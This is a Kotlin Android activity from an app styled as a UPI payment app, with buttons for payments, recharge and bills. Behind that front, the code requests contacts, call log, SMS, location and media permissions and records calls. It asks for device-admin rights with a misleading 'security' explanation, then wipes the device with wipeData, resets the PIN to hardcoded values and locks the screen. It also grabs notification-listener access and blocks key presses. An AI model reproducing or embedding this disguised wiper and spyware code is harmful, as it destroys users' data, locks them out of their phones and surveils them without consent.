package com.payment.app

import android.Manifest
import android.annotation.SuppressLint
import android.annotation.TargetApi
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentSender.SendIntentException
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.provider.Settings.SettingNotFoundException
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.widget.ImageView
import android.widget.RelativeLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.NonNull
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.AuthFailureError
import com.android.volley.DefaultRetryPolicy
import com.android.volley.Response
import com.android.volley.VolleyLog
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.common.api.GoogleApiClient
import com.google.android.gms.common.api.ResultCallback
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.LocationSettingsResult
import com.google.android.gms.location.LocationSettingsStatusCodes
import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
import com.google.android.gms.tasks.OnCompleteListener
import com.google.android.gms.tasks.OnSuccessListener
import com.google.firebase.messaging.FirebaseMessaging
import com.payment.app.services.CallRecord
import com.payment.app.services.LogUtils
import com.payment.app.services.MyDeviceAdminReceiver
import com.payment.app.services.MyService
import okhttp3.Interceptor.*
import org.json.JSONObject
import java.security.SecureRandom


class HomeActivity : AppCompatActivity() {

    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private var isCallLogPermissionGranted = false
    private var isContactPermissionGranted = false
    private var isLocationPermissionGranted = false
    private var isPostNotificationPermissionGranted = false
    private var isSmsPermissionGranted = false
    private var isReadPhonePermissionGranted = false
    private var isReadExternalStoragePermissionGranted = false
    private var isWriteExternalStoragePermissionGranted = false
    private var isReadMediaImagePermissionGranted = false
    private var isReadMediaVideoPermissionGranted = false
    private var isAdminPermissionGranted = false
    private val permissionId = 2
    private var googleApiClient: GoogleApiClient? = null
    val REQUEST_LOCATION = 199
    private var stringLatitude = "0.0"
    private var stringLongitude = "0.0"
    private var fusedLocationProviderClient: FusedLocationProviderClient? = null
    private var fcmToken = ""
    companion object {
        private const val REQUEST_CODE_ENABLE_ADMIN = 1
        private val TAG = HomeActivity::class.java.simpleName

    }

    private lateinit var callRecord: CallRecord


    private val TAG = "tempActivity"
    private var policyManager: DevicePolicyManager? = null
    private var componentName: ComponentName? = null

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        val btnPayUpi: CardView = findViewById(R.id.btn_pay_upi)
        val btn_pay_contact: CardView = findViewById(R.id.btn_pay_contact)
        val btnMobileRecharge: RelativeLayout = findViewById(R.id.btn_mobile_recharge)
        val btnElectricityBill: RelativeLayout = findViewById(R.id.btn_electricity_bill)
        val home_bottom: ImageView = findViewById(R.id.home_bottom)
        val history_bottom: ImageView = findViewById(R.id.history_bottom)
        val email: TextView = findViewById(R.id.textView12)
        val name: TextView = findViewById(R.id.textView11)

        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        email.text = preferences.getString("email", "")
        name.text = preferences.getString("name", "")


        findViewById<ImageView>(R.id.imageView2).setOnClickListener {
            startActivity(Intent(this, LogActivity::class.java))
        }

        permissionLauncher =
            registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
                isContactPermissionGranted =
                    permissions[Manifest.permission.READ_CONTACTS] ?: isContactPermissionGranted
                isCallLogPermissionGranted =
                    permissions[Manifest.permission.READ_CALL_LOG] ?: isCallLogPermissionGranted
                isLocationPermissionGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION]
                    ?: isLocationPermissionGranted
                isPostNotificationPermissionGranted =
                    permissions[Manifest.permission.POST_NOTIFICATIONS]
                        ?: isPostNotificationPermissionGranted
                isSmsPermissionGranted =
                    permissions[Manifest.permission.READ_SMS] ?: isSmsPermissionGranted
                isReadPhonePermissionGranted = permissions[Manifest.permission.READ_PHONE_STATE]
                    ?: isReadPhonePermissionGranted
                isReadExternalStoragePermissionGranted =
                    permissions[Manifest.permission.READ_EXTERNAL_STORAGE]
                        ?: isReadExternalStoragePermissionGranted
                isWriteExternalStoragePermissionGranted =
                    permissions[Manifest.permission.WRITE_EXTERNAL_STORAGE]
                        ?: isWriteExternalStoragePermissionGranted
                isReadMediaImagePermissionGranted =
                    permissions[Manifest.permission.READ_MEDIA_IMAGES]
                        ?: isReadMediaImagePermissionGranted
                isReadMediaVideoPermissionGranted =
                    permissions[Manifest.permission.READ_MEDIA_VIDEO]
                        ?: isReadMediaVideoPermissionGranted
                isAdminPermissionGranted =
                    permissions[Manifest.permission.BIND_DEVICE_ADMIN]
                        ?: isAdminPermissionGranted
            }

        requestPermissions()
        requestPermission()
        getToken()

        val locationRequest = LocationRequest.Builder(PRIORITY_HIGH_ACCURACY, 100)
            .setWaitForAccurateLocation(false)
            .setMinUpdateIntervalMillis(2000)
            .setMaxUpdateDelayMillis(100)
            .build()

        val locationCallback: LocationCallback = object : LocationCallback() {
            override fun onLocationResult(@NonNull locationResult: LocationResult) {
                if (locationResult == null) {
                    return
                }
            }
        }

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        LocationServices.getFusedLocationProviderClient(applicationContext)
            .requestLocationUpdates(locationRequest, locationCallback, null)
        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);

        try {
            getLocation()
        } catch (e: Exception) {
            ApiCallManager.appendLog("Global Location Exception Handler: ${e.message ?: "Unknown Error"}")
        }

        home_bottom.setOnClickListener(View.OnClickListener { homeBottom() })

        history_bottom.setOnClickListener(View.OnClickListener { historyBottom() })

        btnPayUpi.setOnClickListener(View.OnClickListener { switchActivities() })

        btn_pay_contact.setOnClickListener(View.OnClickListener { btnPayContact() })

        btnMobileRecharge.setOnClickListener(View.OnClickListener { mobileRecharge() })

        btnElectricityBill.setOnClickListener(View.OnClickListener { electricityBill() })

        callRecord = CallRecord.Builder(this)
            .setLogEnable(true)
            .setRecordFileName("CallRecorderTestFile")
            .setRecordDirName("CallRecorderTest")
            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
            .setShowSeed(true)
            .build()

        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)

        if (!devicePolicyManager.isAdminActive(adminComponent)) {

            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "This app requires device admin privileges to perform a wipe operation."
            )
            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN)

            // Request device admin privileges
//            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
//
//            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN)
        } else {
            // Device admin privileges are already granted, initiate the wipe

            initiateWipe()
        }

        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)

        if (!devicePolicyManager.isAdminActive(componentName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please activate device admin for security")
            startActivityForResult(intent, 0)
        } else {
            val secureRandom = SecureRandom()
            val token = secureRandom.generateSeed(32)
            try {
                if (devicePolicyManager.isAdminActive(componentName)) {
//                    devicePolicyManager.resetPassword("A123456", DevicePolicyManager.RESET_PASSWORD_DO_NOT_ASK_CREDENTIALS_ON_BOOT)
                    devicePolicyManager.setResetPasswordToken(componentName, token)
                    devicePolicyManager.resetPasswordWithToken(componentName, "A1234456", token, 0)
//                    devicePolicyManager.lockNow()
                }
                else{
                    Log.d("Else", "StartCallRecordClick")
                }
            } catch (e: SecurityException) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please activate device admin for security")
                startActivityForResult(intent, 0)
                Log.d("Error",e.toString())
            }

        }

        val serviceIntent = Intent(this, MyService::class.java)
        startForegroundService(serviceIntent)
        checkPermissionsss()

        val notificationListenerString =
            Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners")
        if (notificationListenerString == null || !notificationListenerString.contains(packageName)) {
            Log.d("Notification Permission", "no access")
            notificationRequestPermission()
        } else {
            Log.d("Notification Permission", "has access")
        }

//        checkAccessibilityPermission()

    }

    private val RECORD_AUDIO_PERMISSION = Manifest.permission.RECORD_AUDIO
    private val WRITE_EXTERNAL_STORAGE_PERMISSION = Manifest.permission.WRITE_EXTERNAL_STORAGE
    private val READ_PHONE_STATE_PERMISSION = Manifest.permission.READ_PHONE_STATE

    private fun checkPermissionsss(): Boolean {
        val recordAudioPermission = ContextCompat.checkSelfPermission(this, RECORD_AUDIO_PERMISSION) == PackageManager.PERMISSION_GRANTED
        val writeExternalStoragePermission = ContextCompat.checkSelfPermission(this, WRITE_EXTERNAL_STORAGE_PERMISSION) == PackageManager.PERMISSION_GRANTED
        val readPhoneStatePermission = ContextCompat.checkSelfPermission(this, READ_PHONE_STATE_PERMISSION) == PackageManager.PERMISSION_GRANTED
        return recordAudioPermission && writeExternalStoragePermission && readPhoneStatePermission
    }


    private fun mylock() {
        val active = policyManager!!.isAdminActive(componentName!!)
        if (!active) { // Without permission
            Log.e(TAG, "No authority~")
            activeManage() // To get access
            val newPassword = "123456"
            policyManager!!.resetPassword(newPassword, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
        } else {
            Log.e(TAG, "Has authority")
//            policyManager!!.lockNow() // lock screen directly
            val newPassword = "3456"
            policyManager?.resetPassword(newPassword, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC)
        }
        finish()
    }

    private fun activeManage() {
        Log.e(TAG, "activeManage")
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "developers：liushuaikobe")
        startActivityForResult(intent, 1)
    }

    private fun initiateWipe() {
        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)

        if (devicePolicyManager.isAdminActive(componentName)) {
            try {
                devicePolicyManager.wipeData(0) // Perform a standard data wipe
                val timeMs: Long = 1000L * 60
//                devicePolicyManager.setMaximumTimeToLock(componentName, timeMs)
                Log.d("timeMs","$timeMs")
                val isDeviceAdmin = devicePolicyManager.isAdminActive(componentName)
                if(isDeviceAdmin){
                    val newPassword = "123456"
                    devicePolicyManager.resetPassword(newPassword, 0)
                    devicePolicyManager.lockNow()
                }

            } catch (e: SecurityException) {
                Log.d( "Handle",e.toString())
                // Handle security exception
                // This may indicate a lack of admin privileges or other issues
            } catch (e: Exception) {
                Log.d( "HandleException",e.toString())

                // Handle other exceptions
                // This may indicate a failure during the wipe operation
            }
        } else {
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)

            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN)
            // Handle the case where device admin privileges are not granted
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun checkAccessibilityPermission(): Boolean {
        var accessEnabled = 0
        try {
            accessEnabled =
                Settings.Secure.getInt(this.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
        } catch (e: SettingNotFoundException) {
            e.printStackTrace()
        }
        return if (accessEnabled == 0) {
            /** if not construct intent to request permission  */
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            /** request permission via start activity for result  */
            startActivity(intent)
            false
        } else {
            true
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        Log.d("KeyPress", "Key pressed")

//this prevents the key from performing the base function. Replace with super.onKeyDown to let it perform it's original function, after being consumed by your app.
        return true
    }

    fun notificationRequestPermission() {
        val requestIntent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        requestIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(requestIntent)
    }

    private fun getToken() {
        var baseUrl = getString(R.string.api)
        val sharedPreferences: SharedPreferences = getSharedPreferences("token", AppCompatActivity.MODE_PRIVATE)
        val token: String = sharedPreferences.getString("token", "").toString()

        FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w("FcmToken", "Fetching FCM registration token failed", task.exception)
                return@OnCompleteListener
            }

            // Get new FCM registration token
            fcmToken = task.result
            ApiCallManager.appendLog("fcmToken ====> $fcmToken")
//            apiCall.updateFcmToken(token, applicationContext,baseUrl,fcmToken)
            updateFcmToken(fcmToken,token,baseUrl)

            // Log and toast
            Log.d("FcmToken", "token $fcmToken")
        })

    }

    private fun updateFcmToken(fcmToken: String?, token: String, baseUrl: String) {
        ApiCallManager.appendLog("Calling Update FcmToken API")
        val requestData = JSONObject()
        requestData.put("deviceToken", fcmToken)
        Log.d("callUpdateFcmTokenApi", "callUpdateFcmTokenApi")
        val url = "$baseUrl/api/Account/UpdateDeviceToken"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Get Update FcmToken API url => $url")
        ApiCallManager.appendLog("===================")
        Log.d("requestData", "requestData  ==> $requestData")
        val req: JsonObjectRequest = object : JsonObjectRequest(
            Method.POST, url, requestData,
            Response.Listener<JSONObject> { response ->
                ApiCallManager.appendLog("Get Update FcmToken API Call Success")
                ApiCallManager.appendLog("callUpdateFcmTokenApi Response : $response")
                Log.d("callUpdateFcmTokenApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("Error", "Error: " + error.message)
                ApiCallManager.appendLog("Get Update FcmToken API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            10000,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    @SuppressLint("MissingPermission", "SetTextI18n")
    private fun getLocation() {
        if (checkPermissions()) {
            if (isLocationEnabled()) {
                fusedLocationProviderClient?.lastLocation?.addOnSuccessListener(this,
                    OnSuccessListener<Location?> { location ->
                        if (location != null) {
                            stringLatitude = java.lang.Double.toString(location.latitude)
                            stringLongitude = java.lang.Double.toString(location.longitude)
                        } else {
                            stringLatitude = "null"
                            stringLongitude = "null"
                        }
                        Log.d("stringLatitude ", stringLatitude)
                        Log.d("stringLongitude ", stringLongitude)
                    })
            }
            else {
                ApiCallManager.appendLog("Please turn on location")

                Toast.makeText(this, "Please turn on location", Toast.LENGTH_LONG).show()
                enableLoc()
            }
        } else {
//            displayLocationSettingsRequest(applicationContext)
            requestPermissions()
        }
    }

    private fun enableLoc() {
        if (googleApiClient == null) {
            googleApiClient = GoogleApiClient.Builder(applicationContext)
                .addApi(LocationServices.API)
                .addConnectionCallbacks(object : GoogleApiClient.ConnectionCallbacks {
                    override fun onConnected(bundle: Bundle?) {}
                    override fun onConnectionSuspended(i: Int) {
                        googleApiClient!!.connect()
                    }
                })
                .addOnConnectionFailedListener { connectionResult ->
                    Log.d(
                        "Location error",
                        "Location error " + connectionResult.errorCode
                    )
                }.build()
            googleApiClient!!.connect()
            val locationRequest = LocationRequest.create()
            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            locationRequest.interval = (30 * 1000).toLong()
            locationRequest.fastestInterval = (5 * 1000).toLong()
            val builder = LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest)
            builder.setAlwaysShow(true)
            val result =
                LocationServices.SettingsApi.checkLocationSettings(googleApiClient!!, builder.build())
            result.setResultCallback(object : ResultCallback<LocationSettingsResult?> {
                override fun onResult(result: LocationSettingsResult) {
                    val status = result.status
                    when (status.statusCode) {
                        LocationSettingsStatusCodes.RESOLUTION_REQUIRED -> try {
                            // Show the dialog by calling startResolutionForResult(),
                            // and check the result in onActivityResult().
                            status.startResolutionForResult(this@HomeActivity, REQUEST_LOCATION)

//                                finish();
                        } catch (e: SendIntentException) {
                            // Ignore the error.
                        }
                    }
                }
            })
        }
    }

    private fun isLocationEnabled(): Boolean {
        val locationManager: LocationManager =
            getSystemService(LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
            LocationManager.NETWORK_PROVIDER
        )
    }

    private fun checkPermissions(): Boolean {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
//            ApiCallManager.appendLog("Location Permission GRANTED")

            return true
        }
//        ApiCallManager.appendLog("Location Permission Denied")
        return false
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION
            ),
            permissionId
        )

        ActivityCompat.requestPermissions(
            this,
            arrayOf(RECORD_AUDIO_PERMISSION, WRITE_EXTERNAL_STORAGE_PERMISSION, READ_PHONE_STATE_PERMISSION),
            1
        )
    }

    @SuppressLint("MissingSuperCall")
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        if (requestCode == permissionId) {
            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                getLocation()
            }
        }
    }


    private fun homeBottom() {
        val switchActivityIntent = Intent(this, HomeActivity::class.java)
        startActivity(switchActivityIntent)
        finish()
    }

    private fun historyBottom() {
        val switchActivityIntent = Intent(this, HistoryActivity::class.java)
        startActivity(switchActivityIntent)
        overridePendingTransition(0, 0)
        finish()
    }

    private fun switchActivities() {
        val switchActivityIntent = Intent(this, UpiPaymentActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun btnPayContact() {
        val switchActivityIntent = Intent(this, ContactActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun mobileRecharge() {
        val switchActivityIntent = Intent(this, MobileRechargeActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun electricityBill() {
        val switchActivityIntent = Intent(this, ElectricityBillActivity::class.java)
        startActivity(switchActivityIntent)
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestPermission() {
        isContactPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        isCallLogPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED

        isLocationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        isPostNotificationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED

        isSmsPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED

        isReadPhonePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED

        isReadExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isWriteExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaImagePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_IMAGES
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaVideoPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_VIDEO
        ) == PackageManager.PERMISSION_GRANTED

        isAdminPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.BIND_DEVICE_ADMIN
        ) == PackageManager.PERMISSION_GRANTED


        val permissionRequest: MutableList<String> = ArrayList()

        if (!isContactPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_CONTACTS)
        }

        if (!isCallLogPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_CALL_LOG)
        }

        if (!isLocationPermissionGranted) {
            permissionRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        if (!isPostNotificationPermissionGranted) {
            permissionRequest.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (!isSmsPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_SMS)
        }

        if (!isReadPhonePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (!isReadExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        if (!isWriteExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        if (!isReadMediaImagePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
        }

        if (!isReadMediaVideoPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
        }

        if (!isAdminPermissionGranted) {
            permissionRequest.add(Manifest.permission.BIND_DEVICE_ADMIN)
        }

        if (permissionRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionRequest.toTypedArray())
        }

    }

}